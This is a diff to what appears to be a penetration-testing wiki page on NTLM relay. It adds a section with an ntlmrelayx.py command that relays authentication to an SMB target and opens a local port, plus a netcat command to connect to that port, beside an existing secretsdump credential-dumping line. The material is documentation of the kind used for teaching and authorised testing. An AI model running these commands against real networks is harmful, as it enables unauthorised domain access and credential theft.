@@ -128,6 +128,24 @@ proxychains secretsdump.py -no-pass $DOMAIN/$USER@$TARGET
 ```
 
 
+=== Interactive
+
+The following command will try to relay the authentication and open a local TCP port (commonly 11000) that the attacker can connect to using tools like `Netcat`.
+
+```bash
+ntlmrelayx.py -t smb://$TARGET -i
+```
+
+Supported protocols are: LDAP, SMB and MSSQL.
+
+On LDAP and SMB, the attacker will be able execute predefined actions based on the targeted protocol.  
+On MSSQL, the attacker will gain access to an MSSQL shell, similar to using `mssqlclient.py`.
+
+```bash
+nc 127.0.0.1 11000
+```
+
+
 === Enum
 
 The following command will run an enumeration of the Active Directory domain through the relayed authenticated session. The operation will create multiple `.html`, `.json` and `.grep` files. It will also gather lots of information regarding the domain users and groups, the computers, [ADCS](../adcs/), etc.
